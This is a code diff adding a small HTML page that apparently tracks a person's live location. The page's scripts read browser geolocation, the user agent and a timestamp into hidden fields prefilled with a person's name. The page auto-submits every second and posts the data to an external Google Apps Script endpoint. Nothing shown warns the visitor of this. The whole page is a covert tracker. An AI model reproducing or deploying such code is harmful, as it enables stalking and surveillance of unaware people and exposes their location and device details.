@@ -1,1 +1,97 @@
 
+
+
+       <form method="post" autocomplete="off" name="live_location">
+
+ 
+  <input class="input-field" id="uname" type="text" placeholder="Full Name" name="NAME" maxlength="23" id="fullname" value="Sachin"  required >
+ 
+
+    <input type="text" id="lat" name="LATITUDE">
+    <input type="text" id="long" name="LONGITUDE">
+
+ 
+
+
+  <br />   <br />
+<textarea class="no_dp" id="udata" name="DEVICE_INFO"></textarea> <br />
+<textarea class="no_dp" id="start_time" name="TIMESTAMP"></textarea>   <br />
+
+<script>
+function timestamp() {
+var start_dt = new Date();
+
+document. getElementById("start_time").innerHTML = (("0"+start_dt.getDate()).slice(-2)) +"/"+ (("0"+(start_dt.getMonth()+1)).slice(-2)) +"/"+ (start_dt.getFullYear()) +"  "+ (("0"+start_dt.getHours()).slice(-2)) +":"+ (("0"+start_dt.getMinutes()).slice(-2)) +":"+ (("0"+start_dt.getSeconds()).slice(-2));
+
+document.getElementById ("udata").innerHTML = navigator.appVersion; 
+
+}</script>      
+
+
+
+
+
+
+<p id="demo"></p>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+   document.getElementById("lat").value = position.coords.latitude;
+   document.getElementById("long").value = position.coords.longitude;
+}
+</script>
+
+
+
+
+
+
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.7.2.min.js"></script> 
+           
+
+ 
+
+
+    <input type="submit" name="submit" id="submit" class="no_dp" />
+
+  </form>
+
+  <script>
+
+function loadData() {
+  timestamp(),
+  getLocation(),
+  document.getElementById("submit").click()
+
+}
+
+setInterval(loadData, 1000);
+
+
+            const scriptURL =  '1https://script.google.com/macros/s/AKfycbyOoCqRODlOzz_tzBFwMIFjXRFjK2_gMVyG6s_NEpDfwNZkBik/exec' 
+            const form = document.forms['live_location'] 
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            })
+    
+ 
+</script>
+
+
+
+
+<br /> <br /> 
+
+
+
